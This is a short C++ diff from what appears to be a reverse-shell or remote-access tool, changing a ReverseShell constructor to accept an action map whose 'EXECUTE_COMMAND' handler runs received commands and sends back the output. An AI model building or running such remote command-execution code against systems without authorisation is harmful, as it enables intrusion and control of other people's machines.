@@ -87,7 +87,7 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
     return 0;
 }
 
-ReverseShell::ReverseShell(const Stream &stream) : Sender(stream){
+ReverseShell::ReverseShell(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap){
     actionMap["EXECUTE_COMMAND"]  = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &ReverseShell::executeCommandAndSendResult, json);
     };
